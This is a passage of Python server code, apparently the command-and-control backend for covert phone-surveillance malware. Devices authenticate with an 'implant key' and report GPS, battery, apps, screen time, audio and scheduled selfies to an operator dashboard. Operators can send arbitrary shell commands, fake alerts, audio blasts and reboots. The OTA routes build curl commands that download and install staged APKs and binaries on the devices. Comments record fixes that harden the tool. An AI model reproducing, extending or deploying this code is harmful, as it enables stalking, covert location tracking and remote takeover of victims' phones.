                        screen_time_minutes if screen_time_minutes is not None
                        else (existing["screen_time_minutes"] if existing else 0)
                    )

                    # Resolve pending location-state check
                    if "loc_state" in data:
                        fut = pending_location_checks.get(client_id)
                        if fut is not None and not fut.done():
                            fut.set_result(int(loc_state_val))

                    # Battery history (record only on level change)
                    if not existing or battery_val != existing["level"]:
                        c.execute(
                            "SELECT unix_time FROM battery_history"
                            " WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1",
                            (client_id,),
                        )
                        last_batt = c.fetchone()
                        gap = int(now_unix - last_batt["unix_time"]) if last_batt else 0
                        c.execute(
                            "INSERT INTO battery_history (device_id, level, timestamp, unix_time, gap_seconds)"
                            " VALUES (?, ?, ?, ?, ?)",
                            (client_id, battery_val, time_str, now_unix, gap),
                        )

                    # Upsert devices row
                    if exists:
                        c.execute(
                            "UPDATE devices SET level=?, lat=?, lon=?, timestamp=?, unix_time=?,"
                            " installed_apps=?, screen_time_minutes=?, charging=? WHERE device_id=?",
                            (battery_val, lat_val, lon_val, time_str, now_unix,
                             apps, current_screen_time, charging_val, client_id),
                        )
                    else:
                        c.execute(
                            "INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time,"
                            " installed_apps, screen_time_minutes, charging) VALUES (?,?,?,?,?,?,?,?,?)",
                            (client_id, battery_val, lat_val, lon_val, time_str, now_unix,
                             apps, current_screen_time, charging_val),
                        )

                    # Daily screen time upsert
                    if screen_time_minutes is not None:
                        date_str = time.strftime("%Y-%m-%d", time.localtime())
                        c.execute(
                            "SELECT id FROM daily_screen_time WHERE device_id = ? AND date = ?",
                            (client_id, date_str),
                        )
                        if c.fetchone():
                            c.execute(
                                "UPDATE daily_screen_time SET minutes = ?, updated_at = ?"
                                " WHERE device_id = ? AND date = ?",
                                (screen_time_minutes, now_unix, client_id, date_str),
                            )
                        else:
                            c.execute(
                                "INSERT INTO daily_screen_time (device_id, date, minutes, updated_at)"
                                " VALUES (?, ?, ?, ?)",
                                (client_id, date_str, screen_time_minutes, now_unix),
                            )

                    # GPS history with deduplication
                    if loc_state_val == 1 and "lat" in data and "lon" in data:
                        try:
                            lat_f = float(lat_val)
                            lon_f = float(lon_val)
                            if validate_coordinates(lat_f, lon_f):
                                ping_iv = float(existing["ping_interval"] if existing else GPS_DEFAULT_INTERVAL_S)
                                if should_record_gps(client_id, lat_f, lon_f, now_unix, min_interval_s=ping_iv):
                                    c.execute(
                                        "INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)"
                                        " VALUES (?, ?, ?, ?, ?, ?)",
                                        (client_id, battery_val, lat_f, lon_f, time_str, now_unix),
                                    )
                                    update_gps_cache(client_id, lat_f, lon_f, now_unix)
                            else:
                                print(f"[ws] Invalid coords from {client_id}: {lat_val},{lon_val}", flush=True)
                        except (ValueError, TypeError) as e:
                            print(f"[ws] Location parse error for {client_id}: {e}", flush=True)

                    db.commit()
                    if is_new_connection:
                        ensure_selfie_schedule(client_id, db)

                    # Push telemetry snapshot to every open browser dashboard immediately.
                    await sse.broadcast("device_update", {
                        "device_id":            client_id,
                        "level":                battery_val,
                        "lat":                  float(lat_val)  if lat_val  else None,
                        "lon":                  float(lon_val)  if lon_val  else None,
                        "charging":             charging_val,
                        "loc_state":            int(loc_state_val),
                        "screen_time_minutes":  current_screen_time,
                        "installed_apps":       apps,
                        "timestamp":            time_str,
                        "unix_time":            now_unix,
                        "ws_connected":         True,
                        "is_online":            True,
                    })

            except WebSocketDisconnect:
                await sse.broadcast("device_disconnected", {"device_id": client_id})
                await ws_manager.disconnect(client_id)
                break
            except Exception as e:
                import traceback
                print(f"[ws] Exception in loop: {e}", flush=True)
                traceback.print_exc()
                await ws_manager.disconnect(client_id)
                break

    except Exception as e:
        import traceback
        print(f"[ws] Outer exception: {e}", flush=True)
        traceback.print_exc()
        await sse.broadcast("device_disconnected", {"device_id": client_id})
        await ws_manager.disconnect(client_id)
    finally:
        db.close()


# ══════════════════════════════════════════════════════════════════════════════
# Server-Sent Events endpoint
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/events")
async def sse_events(request: Request) -> StreamingResponse:
    """Push real-time device events to connected browser dashboard clients."""
    verify_session(request)
    q = await sse.subscribe()

    async def generator():
        try:
            # Send a hello so the browser knows the stream is live.
            yield "event: connected\ndata: {}\n\n"
            while True:
                if await request.is_disconnected():
                    break
                try:
                    msg = await asyncio.wait_for(q.get(), timeout=25.0)
                    yield msg
                except asyncio.TimeoutError:
                    # Keepalive comment — prevents proxies from closing idle streams.
                    yield ": ka\n\n"
        finally:
            await sse.unsubscribe(q)

    return StreamingResponse(
        generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control":    "no-cache, no-store",
            "X-Accel-Buffering": "no",   # disable nginx buffering
            "Connection":       "keep-alive",
        },
    )


# ══════════════════════════════════════════════════════════════════════════════
# Protected media
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/media/audio/{filename}")
async def protected_audio(filename: str, request: Request) -> FileResponse:
    verify_session(request)
    safe_name = os.path.basename(filename)
    file_path = os.path.join(AUDIO_DIR, safe_name)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    mime = "audio/mp4" if safe_name.endswith(".m4a") else "audio/wav"
    return FileResponse(file_path, media_type=mime)


@app.get("/media/selfies/{filename}")
async def protected_selfie(filename: str, request: Request) -> FileResponse:
    verify_session(request)
    safe_name = os.path.basename(filename)
    file_path = os.path.join(SELFIE_DIR, safe_name)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, media_type="image/jpeg")


# ══════════════════════════════════════════════════════════════════════════════
# Auth routes
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/api/login")
async def api_login(request: Request, username: str = Form(...), password: str = Form(...)):
    if username == ADMIN_USERNAME and secrets.compare_digest(hash_password(password), ADMIN_PASSWORD_HASH):
        token = safe_token()
        add_session(token)
        resp = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
        resp.set_cookie(
            key=SESSION_COOKIE_NAME, value=token,
            httponly=True, samesite="strict",
            secure=(request.url.scheme == "https"),
        )
        return resp
    return HTMLResponse(
        "<p style='color:red;text-align:center;margin-top:50px'>Authentication failure. Invalid Key Ring.</p>",
        status_code=401,
    )


@app.get("/login")
async def serve_login() -> FileResponse:
    return FileResponse("templates/login.html", media_type="text/html")


@app.get("/logout")
async def logout():
    resp = RedirectResponse(url="/login", status_code=status.HTTP_303_SEE_OTHER)
    resp.delete_cookie(key=SESSION_COOKIE_NAME)
    return resp


@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    return JSONResponse(status_code=204, content="")


# ══════════════════════════════════════════════════════════════════════════════
# View routes (serve HTML templates)
# ══════════════════════════════════════════════════════════════════════════════

def _serve_template(request: Request, template: str):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse(f"templates/{template}", media_type="text/html")


@app.get("/")
async def serve_index(request: Request):
    return _serve_template(request, "index.html")

@app.get("/history_view")
async def history_view(request: Request):
    return _serve_template(request, "history.html")

@app.get("/errors_view")
async def errors_view(request: Request):
    return _serve_template(request, "errors.html")

@app.get("/apps_view")
async def apps_view(request: Request):
    return _serve_template(request, "apps.html")

@app.get("/selfies_view")
async def selfies_view(request: Request):
    return _serve_template(request, "selfies.html")

@app.get("/updater_status")
async def updater_status(request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    async with ws_manager.lock:
        live = [c for c in ws_manager.active_connections.keys() if c.startswith("updater_")]
    c = db.cursor()
    c.execute(
        "SELECT device_id, timestamp, unix_time FROM devices WHERE device_id LIKE 'updater_%' ORDER BY unix_time DESC"
    )
    rows = c.fetchall()
    updaters = []
    for row in rows:
        did = row["device_id"]
        updaters.append({
            "device_id": did,
            "is_online": did in live,
            "last_seen": row["timestamp"],
            "unix_time": row["unix_time"],
        })
    for did in live:
        if not any(u["device_id"] == did for u in updaters):
            updaters.insert(0, {"device_id": did, "is_online": True, "last_seen": "now", "unix_time": time.time()})
    c.execute(
        "SELECT message, timestamp FROM device_errors WHERE device_id LIKE 'updater_%' ORDER BY unix_time DESC LIMIT 20"
    )
    logs = [{"message": r["message"], "timestamp": r["timestamp"]} for r in c.fetchall()]
    return {"updaters": updaters, "recent_logs": logs}


@app.post("/updater_kill")
async def updater_kill(device_id: str = Form(...), request: Request = Depends(verify_session)):
    if not device_id.startswith("updater_"):
        return JSONResponse({"status": "error", "message": "Not an updater device_id"}, status_code=400)
    if device_id not in ws_manager.active_connections:
        return JSONResponse({"status": "offline", "message": "Updater not connected"}, status_code=404)
    await ws_manager.send_task(device_id, {"task": "updater_stop"})
    return {"status": "sent", "message": "Stop command sent"}


def _ota_component_info(component: str) -> tuple[str, str]:
    info = OTA_COMPONENT_MAP.get(component)
    if not info:
        raise HTTPException(status_code=400, detail=f"Unknown component: {component}")
    return info["package"], info["apk"]


def _list_ota_packages() -> list[dict]:
    packages: list[dict] = []
    if not os.path.isdir(OTA_PACKAGE_DIR):
        return packages
    for name in sorted(os.listdir(OTA_PACKAGE_DIR)):
        pkg_path = os.path.join(OTA_PACKAGE_DIR, name)
        if not os.path.isdir(pkg_path):
            continue
        files = sorted(
            f for f in os.listdir(pkg_path)
            if os.path.isfile(os.path.join(pkg_path, f))
        )
        component = None
        for comp, info in OTA_COMPONENT_MAP.items():
            if info["package"] == name:
                component = comp
                break
        total = sum(os.path.getsize(os.path.join(pkg_path, f)) for f in files)
        packages.append({
            "package": name,
            "component": component or name,
            "files": files,
            "size_bytes": total,
        })
    return packages


@app.get("/updater/packages")
async def updater_packages_list(request: Request):
    verify_session(request)
    return {"packages": _list_ota_packages(), "components": list(OTA_COMPONENT_MAP.keys())}


# FIX O-1: OTA downloads now use short-lived HMAC tokens instead of embedding
# IMPLANT_KEY directly in the URL. Token is valid for 120 seconds and bound to
# the package+filename so it cannot be reused for other files.
import hmac as _hmac
import hashlib as _hashlib

OTA_TOKEN_TTL = 120  # seconds

def _ota_make_token(pkg: str, fname: str) -> str:
    """Generate a short-lived download token: HMAC-SHA256(key, pkg|fname|epoch_window)"""
    window = int(time.time()) // OTA_TOKEN_TTL
    msg = f"{pkg}:{fname}:{window}".encode()
    return _hmac.new(IMPLANT_KEY.encode(), msg, _hashlib.sha256).hexdigest()

def _ota_verify_token(pkg: str, fname: str, token: str) -> bool:
    """Accept the token for the current window or the previous one (clock skew)."""
    for drift in (0, -1):
        window = int(time.time()) // OTA_TOKEN_TTL + drift
        msg = f"{pkg}:{fname}:{window}".encode()
        expected = _hmac.new(IMPLANT_KEY.encode(), msg, _hashlib.sha256).hexdigest()
        if _hmac.compare_digest(token, expected):
            return True
    return False


@app.get("/ota_token/{package_name}/{filename}")
async def ota_get_token(package_name: str, filename: str, request: Request):
    """Operator-facing endpoint: issue a short-lived download token."""
    verify_session(request)
    safe_pkg  = sanitize_device_id(package_name)
    safe_file = os.path.basename(filename)
    return {"token": _ota_make_token(safe_pkg, safe_file), "ttl": OTA_TOKEN_TTL}


@app.get("/ota_download/{package_name}/{filename}")
async def ota_download(package_name: str, filename: str, token: str = "", implant_key: str = ""):
    # FIX O-1: accept either a short-lived token OR the implant_key for backward
    # compatibility with existing reporter curl commands during transition.
    safe_pkg  = sanitize_device_id(package_name)
    # FIX O-3: validate filename against the actual files in the package directory
    # rather than trusting os.path.basename alone.
    safe_file = os.path.basename(filename)
    pkg_dir = os.path.join(OTA_PACKAGE_DIR, safe_pkg)
    allowed = set(os.listdir(pkg_dir)) if os.path.isdir(pkg_dir) else set()
    if safe_file not in allowed:
        raise HTTPException(status_code=404, detail="File not found")
    path = os.path.join(OTA_PACKAGE_DIR, safe_pkg, safe_file)
    if not os.path.isfile(path):
        raise HTTPException(status_code=404, detail="File not found")

    if token and _ota_verify_token(safe_pkg, safe_file, token):
        pass  # valid short-lived token
    elif implant_key and secrets.compare_digest(implant_key, IMPLANT_KEY):
        pass  # legacy implant_key auth (deprecated — prefer token)
    else:
        raise HTTPException(status_code=403, detail="Unauthorized")

    return FileResponse(path, filename=safe_file)


@app.post("/updater/upload_package")
async def updater_upload_package(
    request: Request,
    component: str = Form(...),
    file: UploadFile = File(...),
):
    verify_session(request)
    pkg_name, apk_name = _ota_component_info(component)
    target_dir = os.path.join(OTA_PACKAGE_DIR, pkg_name)
    # FIX O-2: enforce 200 MB cap to prevent server disk exhaustion from huge APK uploads.
    MAX_OTA_BYTES = 200 * 1024 * 1024
    content = await file.read(MAX_OTA_BYTES + 1)
    if len(content) > MAX_OTA_BYTES:
        return JSONResponse({"status": "error", "message": "File too large (>200 MB)"}, status_code=413)
    if not content:
        return JSONResponse({"status": "error", "message": "Empty upload"}, status_code=400)

    fname = (file.filename or "").lower()
    shutil.rmtree(target_dir, ignore_errors=True)
    os.makedirs(target_dir, exist_ok=True)

    try:
        if fname.endswith(".zip"):
            with tempfile.TemporaryDirectory() as td:
                zpath = os.path.join(td, "upload.zip")
                with open(zpath, "wb") as zf:
                    zf.write(content)
                with zipfile.ZipFile(zpath) as zf:
                    zf.extractall(td)
                copied = 0
                for root, _, files in os.walk(td):
                    for f in files:
                        if f == "upload.zip":
                            continue
                        src = os.path.join(root, f)
                        rel = os.path.relpath(src, td)
                        dest = os.path.join(target_dir, rel)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        shutil.copy2(src, dest)
                        copied += 1
                if copied == 0:
                    return JSONResponse({"status": "error", "message": "Zip contained no files"}, status_code=400)
        elif component == "reporter":
            with open(os.path.join(target_dir, "reporter"), "wb") as out:
                out.write(content)
        else:
            with open(os.path.join(target_dir, apk_name), "wb") as out:
                out.write(content)
    except zipfile.BadZipFile:
        return JSONResponse({"status": "error", "message": "Invalid zip file"}, status_code=400)
    except OSError as exc:
        return JSONResponse({"status": "error", "message": str(exc)}, status_code=500)

    files = [
        f for f in os.listdir(target_dir)
        if os.path.isfile(os.path.join(target_dir, f))
    ]
    return {
        "status": "ok",
        "component": component,
        "package": pkg_name,
        "files": files,
        "message": f"Uploaded {len(files)} file(s) for {component}",
    }


@app.post("/updater/delete_package")
async def updater_delete_package(
    request: Request,
    component: str = Form(...),
):
    verify_session(request)
    pkg_name, _ = _ota_component_info(component)
    target_dir = os.path.join(OTA_PACKAGE_DIR, pkg_name)
    if os.path.isdir(target_dir):
        shutil.rmtree(target_dir)
    return {"status": "ok", "message": f"Removed staged package {pkg_name}"}


@app.post("/updater/push_staging")
async def updater_push_staging(
    request: Request,
    reporter_device_id: str = Form(...),
    components: str = Form("all"),
):
    verify_session(request)
    if not validate_device_id(reporter_device_id):
        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
    if reporter_device_id not in ws_manager.active_connections:
        return JSONResponse({"status": "offline", "message": "Reporter not connected"}, status_code=404)

    staged = _list_ota_packages()
    if not staged:
        return JSONResponse({"status": "error", "message": "No packages staged on server"}, status_code=400)

    want_all = components.strip().lower() in ("", "all", "*")
    wanted = {c.strip() for c in components.split(",") if c.strip()} if not want_all else None

    to_push: list[dict] = []
    for pkg in staged:
        if wanted is not None and pkg["component"] not in wanted and pkg["package"] not in wanted:
            continue
        if not pkg["files"]:
            continue
        to_push.append(pkg)

    if not to_push:
        return JSONResponse({"status": "error", "message": "No matching staged packages"}, status_code=400)

    base = str(request.base_url).rstrip("/")
    device_ota = "/data/local/tmp/ota"
    parts: list[str] = [f"mkdir -p {device_ota}"]
    file_count = 0
    for pkg in to_push:
        pkg_name = pkg["package"]
        for fname in pkg["files"]:
            # FIX O-1: use short-lived HMAC token instead of embedding IMPLANT_KEY in the URL.
            # Token is bound to pkg_name+fname and expires in 120 seconds.
            tok = _ota_make_token(pkg_name, fname)
            url = f"{base}/ota_download/{pkg_name}/{fname}?token={tok}"
            dest = f"{device_ota}/{pkg_name}/{fname}"
            parts.append(f"mkdir -p {device_ota}/{pkg_name}")
            # FIX O-5: use '; ' separator instead of ' && ' so a single failed curl
            # does NOT abort the remaining downloads. Log each result separately.
            parts.append(f"curl -fsS '{url}' -o '{dest}' || echo 'OTA_FAIL:{fname}'")
            file_count += 1

    # FIX O-5: join with '; ' — run all commands regardless of individual failures.
    cmd = " ; ".join(parts)
    delivered = await ws_manager.send_task(reporter_device_id, {"task": "shell", "command": cmd})
    return {
        "status": "sent" if delivered else "queued",
        "delivered": delivered,
        "packages": [p["component"] for p in to_push],
        "files": file_count,
        "message": f"Push command sent ({file_count} files across {len(to_push)} package(s))",
    }


@app.post("/updater/install_staging")
async def updater_install_staging(
    request: Request,
    updater_device_id: str = Form(...),
    component: str = Form("all"),
):
    verify_session(request)
    if not updater_device_id.startswith("updater_"):
        return JSONResponse({"status": "error", "message": "Not an updater device_id"}, status_code=400)
    if updater_device_id not in ws_manager.active_connections:
        return JSONResponse({"status": "offline", "message": "Updater not connected"}, status_code=404)

    comp = component.strip()
    if comp.lower() in ("all", "*", ""):
        task = {"task": "updater_update_all"}
    elif comp == "reporter":
        task = {"task": "updater_update_reporter", "source": "/data/local/tmp/ota/_reporter/reporter"}
    else:
        if comp not in OTA_COMPONENT_MAP:
            return JSONResponse({"status": "error", "message": f"Unknown component: {comp}"}, status_code=400)
        pkg_name = OTA_COMPONENT_MAP[comp]["package"]
        task = {"task": "updater_update_app_dir", "component": comp, "package": pkg_name}

    await ws_manager.send_task(updater_device_id, task)
    return {"status": "sent", "task": task["task"], "component": comp}


@app.get("/updater_view")
async def updater_view(request: Request):
    return _serve_template(request, "updater.html")


# ══════════════════════════════════════════════════════════════════════════════
# Device & telemetry endpoints
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/battery_report")
async def receive_report(
    implant_key: str = Form(...),
    device_id:   str = Form(...),
    level:       int = Form(...),
    lat:       float = Form(...),
    lon:       float = Form(...),
    db: sqlite3.Connection = Depends(get_db),
):
    global REQUEST_COUNTER
    REQUEST_COUNTER += 1

    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)

    time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    now_unix = time.time()
    c        = db.cursor()

    c.execute(
        "SELECT ping_interval, record_audio, record_duration, notif_state, notif_text,"
        " play_audio, reboot_cmd, shutdown_cmd FROM devices WHERE device_id = ?",
        (device_id,),
    )
    row = c.fetchone()

    if row:
        ping_interval  = row["ping_interval"]
        record_audio   = row["record_audio"]
        record_duration = row["record_duration"]
        notif_state    = row["notif_state"]
        notif_text     = row["notif_text"]
        play_audio     = row["play_audio"]
        reboot_cmd     = row["reboot_cmd"]
        shutdown_cmd   = row["shutdown_cmd"]
        c.execute(
            "UPDATE devices SET level=?, lat=?, lon=?, timestamp=?, unix_time=? WHERE device_id=?",
            (level, lat, lon, time_str, now_unix, device_id),
        )
    else:
        ping_interval = 5; record_audio = 0; record_duration = 30
        notif_state = 0; notif_text = ""; play_audio = 0; reboot_cmd = 0; shutdown_cmd = 0
        c.execute(
            "INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time,"
            " ping_interval, record_audio, record_duration, notif_state, notif_text,"
            " play_audio, reboot_cmd, shutdown_cmd) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (device_id, level, lat, lon, time_str, now_unix, ping_interval, record_audio,
             record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd),
        )

    # One-time commands: reset after delivery
    if reboot_cmd == 1 or shutdown_cmd == 1:
        c.execute("UPDATE devices SET reboot_cmd=0, shutdown_cmd=0 WHERE device_id=?", (device_id,))

    # GPS deduplication (same logic as WebSocket path)
    if validate_coordinates(lat, lon) and should_record_gps(
        device_id, lat, lon, now_unix, min_interval_s=float(ping_interval)
    ):
        c.execute(
            "INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time) VALUES (?,?,?,?,?,?)",
            (device_id, level, lat, lon, time_str, now_unix),
        )
        update_gps_cache(device_id, lat, lon, now_unix)

    db.commit()
    return {
        "status": "success",
        "next_ping_seconds":    ping_interval,
        "record_audio":         record_audio,
        "notification_command": notif_state,
        "notification_text":    notif_text,
        "play_audio":           play_audio,
        "reboot_cmd":           reboot_cmd,
        "shutdown_cmd":         shutdown_cmd,
    }


@app.get("/devices")
async def get_devices(request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT device_id FROM devices WHERE device_id NOT LIKE 'updater_%' ORDER BY device_id ASC")
    return {"devices": [r["device_id"] for r in c.fetchall()]}


@app.get("/active_connections")
async def get_active_connections(request: Request):
    verify_session(request)
    async with ws_manager.lock:
        connections = list(ws_manager.active_connections.keys())
    return {"connections": connections}


@app.post("/send_task")
async def send_task(
    device_id: str = Form(...),
    task:      str = Form(...),
    payload:   str = Form("{}"),
    request: Request = Depends(verify_session),
):
    if device_id not in ws_manager.active_connections:
        return JSONResponse({"status": "offline", "message": "Connection not active"}, status_code=404)

    data = {"task": task}
    try:
        extra = json.loads(payload or "{}")
        if isinstance(extra, dict):
            extra.pop("task", None)
            extra.pop("implant_key", None)
            data.update(extra)
    except Exception:
        pass

    if task == "audio_blast":
        play_value = data.get("play") or data.get("play_audio")
        if play_value in (None, ""):
            return JSONResponse({"status": "error", "message": "audio_blast requires play or play_audio"}, status_code=400)
        data["play"] = str(int(play_value)) if str(play_value).isdigit() else str(play_value)

    await ws_manager.send_task(device_id, data)
    return {"status": "sent", "task": data}


@app.get("/check_commands")
async def check_commands(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    if not validate_device_id(device_id):
        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
    c = db.cursor()
    c.execute(
        "SELECT ping_interval, record_audio, notif_state, notif_text, play_audio"
        " FROM devices WHERE device_id = ?",
        (device_id,),
    )
    row = c.fetchone()
    if row is None:
        return JSONResponse({"status": "error", "message": "Device not found"}, status_code=404)
    return dict(row)


@app.get("/get_errors")
async def get_errors(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute(
        "SELECT source, message, timestamp FROM device_errors"
        " WHERE device_id = ? ORDER BY unix_time DESC LIMIT 50",
        (device_id,),
    )
    return {"errors": [{"source": r["source"], "message": r["message"], "timestamp": r["timestamp"]}
                       for r in c.fetchall()]}


@app.get("/stats")
async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()

    activity_state = "Stationary"
    is_online      = False
    speed_ms       = 0.0
    speed_kmh      = 0.0

    if row:
        c.execute(
            "SELECT lat, lon, unix_time FROM history"
            " WHERE device_id = ? ORDER BY unix_time DESC LIMIT 2",
            (device_id,),
        )
        points = c.fetchall()
        if len(points) == 2:
            dist     = haversine(points[1]["lat"], points[1]["lon"], points[0]["lat"], points[0]["lon"])
            time_diff = abs(points[0]["unix_time"] - points[1]["unix_time"])
            if time_diff > 0:
                speed_ms  = round(dist / time_diff, 2)
                speed_kmh = round(speed_ms * 3.6, 2)
                if speed_ms > 1.5:  # above walking pace — not GPS drift
                    activity_state = "Moving"

        if device_id in ws_manager.active_connections:
            is_online = True
        elif row["unix_time"] and (time.time() - row["unix_time"] < 180):
            is_online = True
        else:
            c.execute(
                "SELECT unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1",
                (device_id,),
            )
            lt = c.fetchone()
            if lt and lt["unix_time"] and (time.time() - lt["unix_time"] < 180):
                is_online = True

    if row:
        result = dict(row)
        # FIX M-3: differentiate ws_connected (live WebSocket) from is_online
        # (recently seen ≤3 min grace window). Commands only reliably deliver
        # when ws_connected=True; is_online=True but ws_connected=False means the
        # device recently dropped and commands will be queued.
        ws_connected = device_id in ws_manager.active_connections
        result.update({
            "activity":     activity_state,
            "ws_connected": ws_connected,
            "is_online":    is_online,
            "speed_ms":     speed_ms,
            "speed_kmh":    speed_kmh,
        })
        return JSONResponse(
            content=result,
            headers={"Cache-Control": "no-store, no-cache, must-revalidate", "Pragma": "no-cache"},
        )

    return {"level": "0", "timestamp": "Waiting for devices...", "is_online": False, "ws_connected": False}


@app.get("/history")
async def get_history(
    device_id: str, request: Request, hours: float = 0,
    db: sqlite3.Connection = Depends(get_db),
):
    verify_session(request)
    c = db.cursor()
    if hours > 0:
        threshold = time.time() - (hours * 3600)
        c.execute(
            "SELECT lat, lon FROM history WHERE device_id = ? AND unix_time >= ?"
            " ORDER BY unix_time DESC LIMIT 1000",
            (device_id, threshold),
        )
    else:
        c.execute(
            "SELECT lat, lon FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 500",
            (device_id,),
        )
    return {"path": [[r["lat"], r["lon"]] for r in c.fetchall()]}


@app.get("/history_detailed")
async def get_history_detailed(
    device_id: str, request: Request,
    start_time: Optional[float] = None, end_time: Optional[float] = None,
    page: int = 1, per_page: int = 500,
    db: sqlite3.Connection = Depends(get_db),
):
    verify_session(request)
    c      = db.cursor()
    offset = (page - 1) * per_page

    if start_time and end_time:
        c.execute(
            "SELECT lat, lon, level, timestamp, unix_time FROM history"
            " WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?"
            " ORDER BY unix_time DESC LIMIT ? OFFSET ?",
            (device_id, start_time, end_time, per_page, offset),
        )
    else:
        c.execute(
            "SELECT lat, lon, level, timestamp, unix_time FROM history"
            " WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?",
            (device_id, per_page, offset),
        )
    rows = c.fetchall()

    if start_time and end_time:
        c.execute(
            "SELECT COUNT(*) FROM history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?",
            (device_id, start_time, end_time),
        )
    else:
        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ?", (device_id,))
    total = c.fetchone()[0]

    history_data = []
    for i, r in enumerate(rows):
        speed = gap = 0
        if i > 0:
            prev = rows[i - 1]
            gap  = int(prev["unix_time"] - r["unix_time"])
            if gap > 0:
                dist_m = haversine(r["lat"], r["lon"], prev["lat"], prev["lon"])
                speed  = round((dist_m / 1000) / (gap / 3600), 1)  # km/h
        history_data.append({
            "lat": r["lat"], "lon": r["lon"], "level": r["level"],
            "time": r["timestamp"], "unix_time": r["unix_time"],
            "speed": speed, "gap": gap,
        })

    return {
        "history":     history_data,
        "total":       total,
        "page":        page,
        "per_page":    per_page,
        "total_pages": math.ceil(total / per_page) if total > 0 else 1,
    }


@app.get("/battery_history")
async def battery_history(
    device_id: str, request: Request,
    start_time: Optional[float] = None, end_time: Optional[float] = None,
    page: int = 1, per_page: int = 200,
    db: sqlite3.Connection = Depends(get_db),
):
    verify_session(request)
    c      = db.cursor()
    offset = (page - 1) * per_page

    if start_time and end_time:
        c.execute(
            "SELECT level, timestamp, unix_time, gap_seconds FROM battery_history"
            " WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?"
            " ORDER BY unix_time DESC LIMIT ? OFFSET ?",
            (device_id, start_time, end_time, per_page, offset),
        )
        rows = c.fetchall()
        c.execute(
            "SELECT COUNT(*) FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?",
            (device_id, start_time, end_time),
        )
    else:
        c.execute(
            "SELECT level, timestamp, unix_time, gap_seconds FROM battery_history"
            " WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?",
            (device_id, per_page, offset),
        )
        rows = c.fetchall()
        c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ?", (device_id,))
    total = c.fetchone()[0]

    return {
        "history": [
            {"level": r["level"], "time": r["timestamp"],
             "unix_time": r["unix_time"], "gap_seconds": r["gap_seconds"]}
            for r in rows
        ],
        "total": total, "page": page, "per_page": per_page,
        "total_pages": math.ceil(total / per_page) if total > 0 else 1,
    }


@app.get("/screen_time_summary")
async def screen_time_summary(
    device_id: str, date: Optional[str] = None,
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    if not date:
        date = time.strftime("%Y-%m-%d", time.localtime())
    c = db.cursor()
    c.execute(
        "SELECT minutes, updated_at FROM daily_screen_time WHERE device_id = ? AND date = ?",
        (device_id, date),
    )
    row = c.fetchone()
    if row:
        return {"device_id": device_id, "date": date, "minutes": row["minutes"], "updated_at": row["updated_at"]}
    return {"device_id": device_id, "date": date, "minutes": 0, "updated_at": None}


# ══════════════════════════════════════════════════════════════════════════════
# Command endpoints
# ══════════════════════════════════════════════════════════════════════════════

# FIX M-1: /set_ping was a duplicate of /set_interval without WebSocket delivery.
# Replaced with a redirect alias to preserve any legacy callers.
@app.post("/set_ping")
async def set_ping(
    device_id: str = Form(...), seconds: int = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    # Delegate to set_interval logic so WS task is also sent
    db.cursor().execute("UPDATE devices SET ping_interval=? WHERE device_id=?", (seconds, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "set_interval", "interval": seconds})
    return {"status": "success"}


@app.post("/set_interval")
async def set_interval(
    device_id: str = Form(...), interval: int = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    db.cursor().execute("UPDATE devices SET ping_interval=? WHERE device_id=?", (interval, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "set_interval", "interval": interval})
    return {"status": "success"}


@app.post("/set_notification")
async def set_notification(
    device_id: str = Form(...), state: int = Form(...), text: str = Form(""),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    delivered = False
    if device_id in ws_manager.active_connections:
        delivered = await ws_manager.send_task(device_id, {"task": "system_alert", "state": state, "text": text})

